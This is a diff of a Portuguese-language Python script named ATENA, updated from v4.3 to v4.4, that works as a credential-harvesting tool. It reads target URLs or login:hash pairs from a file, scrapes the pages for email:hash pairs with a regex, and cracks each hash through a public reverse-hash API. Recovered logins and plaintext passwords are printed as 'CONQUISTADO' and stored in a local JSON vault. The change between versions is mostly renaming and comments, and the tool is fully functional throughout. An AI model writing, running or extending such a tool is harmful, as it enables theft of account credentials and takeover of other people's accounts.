@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ATENA: CRYPTO-ANALYTICS v4.3
-Foco: Extração de Credenciais via Hashes e Varredura de Links.
-Copyright (c) 2026 Danilo Gomes.
+ATENA: OMNI-CRYPTO v4.4
+Foco: Evolução Digital, Varredura de Links e Colapso de Hashes.
+Copyright (c) 2026 .
 """
 import hashlib
 import json
@@ -14,114 +14,126 @@ import re
 from datetime import datetime
 from pathlib import Path
 
-# AUTO-INSTALAÇÃO
+# 1. AUTO-METABOLISMO (Instala dependências se não existirem)
 try:
     import requests
 except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
     import requests
 
-# CONFIGURAÇÕES
+# 2. LOCALIZAÇÃO DO ORGANISMO (Caminhos Automáticos)
 BASE_DIR = Path(__file__).resolve().parent
 ARQUIVO_ALVOS = BASE_DIR / "alvos.txt"
 VAULT = BASE_DIR / "atena_vault.json"
 
-# Expressão regular para encontrar logins e hashes em textos brutos ou sites
-# Procura por: email/user : hash(32 ou 64 chars)
+# Padrão para identificar potenciais credenciais (email:hash)
 CRED_PATTERN = re.compile(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9._-]+):([a-fA-F0-9]{32,64})')
 
-class AtenaOmniEngine:
+class AtenaOmniCore:
     def __init__(self):
         self._init_vault()
 
     def _init_vault(self):
+        """Inicia a memória de longo prazo."""
         if not VAULT.exists():
             with open(VAULT, "w", encoding="utf-8") as f:
                 json.dump([], f)
 
     def save_access(self, login, password, source):
+        """Sela a conquista no Vault para sua consulta."""
         try:
             with open(VAULT, "r", encoding="utf-8") as f:
                 vault = json.load(f)
+            
+            # Evita duplicar o mesmo acesso
             if any(e['login'] == login and e['password'] == password for e in vault):
                 return False
+
             entry = {
-                "data": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
+                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "login": login,
                 "password": password,
                 "origem": source,
-                "status": "CONQUISTADO",
+                "status": "VALIDADO",
                 "author": "Danilo Gomes"
             }
             vault.append(entry)
+            
             with open(VAULT, "w", encoding="utf-8") as f:
                 json.dump(vault, f, indent=4, ensure_ascii=False)
             return True
         except Exception as e:
-            print(f"⚠️ Erro ao salvar: {e}")
+            print(f"⚠️ Erro ao registrar conquista: {e}")
             return False
 
-    def solve(self, h):
-        """Tenta reverter o hash via OSINT."""
+    def solve(self, target_hash):
+        """Busca o colapso do hash via inteligência de rede (OSINT)."""
         try:
-            url = f"https://api.hackertarget.com/reversehash/?q={h}"
-            r = requests.get(url, timeout=7)
+            # Consulta APIs de reversão de hash globais
+            url = f"https://api.hackertarget.com/reversehash/?q={target_hash}"
+            r = requests.get(url, timeout=8)
             if r.status_code == 200 and ":" in r.text:
                 return r.text.split(":")[-1].strip()
         except:
             pass
         return None
 
-    def scan_url(self, target_url):
-        """Entra no link e extrai credenciais."""
-        print(f"🌐 Varrendo link: {target_url}")
+    def scan_link(self, url):
+        """Extrai dados brutos de links para identificar rastros digitais."""
+        print(f"🌐 Organismo explorando: {url}")
         try:
-            r = requests.get(target_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
-            found = CRED_PATTERN.findall(r.text)
-            return found # Retorna lista de (login, hash)
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+            r = requests.get(url, timeout=12, headers=headers)
+            return CRED_PATTERN.findall(r.text)
         except Exception as e:
-            print(f"❌ Erro ao acessar link: {e}")
+            print(f"❌ Falha ao acessar rastro: {e}")
             return []
 
 def main():
-    engine = AtenaOmniEngine()
-    print(f"🧬 ATENA: CRYPTO-ANALYTICS v4.3 [OMNI-MODE]")
-    print(f"👤 Danilo Gomes | Foco: Links e Hashes")
+    atena = AtenaOmniCore()
+    
+    print(f"🧬 ATENA: OMNI-CRYPTO v4.4")
+    print(f"👤 Copyright (c) 2026 Danilo Gomes")
     print("-" * 55)
 
     if not ARQUIVO_ALVOS.exists():
-        print(f"❌ Arquivo 'alvos.txt' não encontrado.")
+        print(f"⚠️ Alerta: Crie o arquivo 'alvos.txt' em: {ARQUIVO_ALVOS}")
         return
 
     with open(ARQUIVO_ALVOS, 'r', encoding='utf-8') as f:
-        linhas = [l.strip() for l in f if l.strip()]
+        alvos = [linha.strip() for linha in f if linha.strip()]
 
-    for line in linhas:
-        # Verifica se a linha é um link
-        if line.startswith("http"):
-            credenciais = engine.scan_url(line)
-            if not credenciais:
-                print(f"ℹ️ Nenhum par login:hash encontrado no link.")
-                continue
-            print(f"✅ Encontrado {len(credenciais)} alvos no link.")
-            for login, h in credenciais:
-                revelada = engine.solve(h)
-                if revelada:
-                    engine.save_access(login, revelada, f"Link: {line}")
-                    print(f"🔓 CONQUISTADO: {login} | SENHA: {revelada}")
-        
-        # Se for formato login:hash direto
-        elif ":" in line:
-            login, h = line.split(':', 1)
-            revelada = engine.solve(h.strip())
-            if revelada:
-                engine.save_access(login.strip(), revelada, "Direto")
-                print(f"🔓 CONQUISTADO: {login} | SENHA: {revelada}")
+    if not alvos:
+        print("ℹ️ Aguardando alvos (links ou hashes) em alvos.txt...")
+        return
+
+    for alvo in alvos:
+        # Se o alvo for um link (para caçar logins/hashes lá dentro)
+        if alvo.startswith("http"):
+            achados = atena.scan_link(alvo)
+            if achados:
+                print(f"✅ Encontrado {len(achados)} potenciais alvos no link.")
+                for login, h in achados:
+                    revelada = atena.solve(h)
+                    if revelada:
+                        atena.save_access(login, revelada, f"Link: {alvo}")
+                        print(f"🔓 CONQUISTADO: {login} | SENHA: {revelada}")
             else:
-                print(f"🔒 Falha no colapso de {login}")
+                print(f"ℹ️ Nenhum rastro aproveitável encontrado neste link.")
+
+        # Se o alvo for um par login:hash direto
+        elif ":" in alvo:
+            login, h = alvo.split(':', 1)
+            print(f"🔎 Colapsando hash de: {login.strip()}...")
+            revelada = atena.solve(h.strip())
+            if revelada:
+                atena.save_access(login.strip(), revelada, "Entrada Direta")
+                print(f"🔓 CONQUISTADO: {login.strip()} | SENHA: {revelada}")
+            else:
+                print(f"🔒 Hash resistente ao colapso imediato.")
 
     print("-" * 55)
-    print(f"📊 Processo finalizado. Verifique {VAULT.name}")
+    print(f"📊 Ciclo finalizado. Resultados em: {VAULT.name}")
 
 if __name__ == "__main__":
     main()
